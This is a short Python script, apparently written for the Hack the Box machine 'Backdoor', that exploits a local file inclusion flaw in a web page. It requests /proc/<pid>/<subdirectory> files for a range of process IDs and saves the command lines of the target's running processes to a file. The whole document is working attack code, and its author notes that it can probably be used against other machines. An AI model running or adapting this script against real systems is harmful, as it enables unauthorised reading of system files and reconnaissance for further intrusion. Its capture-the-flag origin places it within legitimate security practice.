#!/usr/bin/env python3

# Author: Peter Cipolone
# Date September 28, 2022
#
##########
# Notes: #
##########
# This program was written to enumerate the command line information for the running processes
# on the target machine, leveraging a LFI vulnerability. It was specifically designed for the
# machine Backdoor on Hack the Box. It can probably be used for other machines, but then you
# won't need the outputFormat method.
#
###############
# Parameters: #
###############
# URL - The URL which has the LFI vulnerability
# PID Count - This is the number of process numbers you want to search for. Usually a number between 1000-2000 is enough
# Process_Subdirectory - This is where you specify what you are searching for. A complete list of subdirectories can be found at
#       https://www.kernel.org/doc/html/latest/filesystems/proc.html
# OutputFile - The name of the file that receives the results.
#
############
# Methods: #
############
# outputFormat:
#       Param: procInfo - Receives the response of the GET request
#       Returns: The command line arguments that was used in the process


import sys
import requests

if len(sys.argv) != 5:
    print ('Error: Missing parameter!')
    print ('Syntax: enumProc.py [URL] [PID Count] [Process_Subdirectory] [Output_File]')
    print ('Example: enumProc.py http://10.10.10.10/file.php?parm= 2000 cmdline results.txt\n')
    sys.exit()

url = sys.argv[1]
pidNumberMax = sys.argv[2]
procFile = sys.argv[3]
outputFile = sys.argv[4]
pid = 1
resultsFile = open(outputFile, mode = "w")

def outputFormat (procInfo):
        i = 1
        while i <= 3:
                procInfo = procInfo.replace('/proc/' + str(pid) + '/' + procFile, '')
                i = i + 1
        procInfo = procInfo.replace('<script>window.close()</script>', '')
        return procInfo


try:
        while pid <= int(pidNumberMax):
                request = requests.get(url + '/proc/' + str(pid) + '/' + procFile)

                if len(request.text) > 1:
                        cmdInfo = outputFormat(request.text)
                        if len(cmdInfo) > 0:
                                resultsFile.write('PID: ' + str(pid) + ' - ' + cmdInfo + '\n')

                pid = pid + 1

        resultsFile.close()
        print ('Done')
        print ('Process information can be found in ' + outputFile + '\n')


except: print ('Error: Invalid Argument(s)')
